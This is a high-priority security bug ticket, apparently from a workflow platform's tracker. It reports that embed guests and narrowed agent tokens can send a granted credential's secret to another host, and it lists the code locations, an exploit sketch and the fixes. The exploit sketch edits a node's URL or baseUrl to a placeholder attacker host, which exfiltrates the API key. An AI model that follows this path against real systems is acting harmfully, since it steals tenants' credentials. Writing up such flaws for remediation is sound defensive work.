---
id: BUG-xkz7qx
title: An embed guest or a narrowed agent token can re-point a granted credential to another host and read its secret
status: todo
priority: high
labels:
    - security
    - credentials
    - embedding
    - tenancy
parent: EPIC-brpz48
created: "2026-09-25T12:48:09Z"
updated: "2026-09-25T12:48:09Z"
---

# Description

Confinement checks only which credential ids a document attaches. It never checks which node uses a credential or where the request goes.

- **Embed:** nodes/embedscope.go:72-98 checks only the attached credential ids.
- **Scoped API keys:** they get no document check at all. `embedDocumentProblem` runs only for embed sessions (internal/api/handlers/embedscope.go:42-53).
- **Compiler:** it never checks a credential's type against the node's declared types (internal/workflow/compiler.go:309-316). An HTTP Request node can carry `{"openAiApi": id}`, and `ResolveNodeCredential` applies it (internal/engine/authenticate.go:121-137).
- **Default scopes:** `openAiApi`, `openRouterApi` and `telegramApi` have no default domain scope (internal/credentials/builtin.go:164-243). An empty list allows every host. Only Google has defaults.
- **AI model node:** its user-editable `baseUrl` (nodes/ai.go:265) passes the scope check when the scope is empty (:1158).

**Exploit:** an embed guest with `workflow:write` edits the workflow so the key goes to an attacker's host, for example an HTTP node with `url=https://attacker/…` or an AI node with `baseUrl=https://attacker/v1`, and runs it. The key arrives at the attacker. safety-boundaries.md accepts this risk for tenant writers, but embed guests and narrowed tokens are exactly the principals confinement exists to hold back.

# Acceptance Criteria
- [ ] Default domain scopes: `openAiApi` → api.openai.com; `openRouterApi` → openrouter.ai; `telegramApi` → api.telegram.org. Check for other fixed-host types too.
- [ ] The compiler refuses a credential type the node does not declare.
- [ ] Embed sessions and scoped keys may not run a document that attaches an unscoped credential, or document confinement is bound to the node type and target host. `EmbedScopeIssues` applies to scoped keys as well.
- [ ] Tests cover each exploit path.
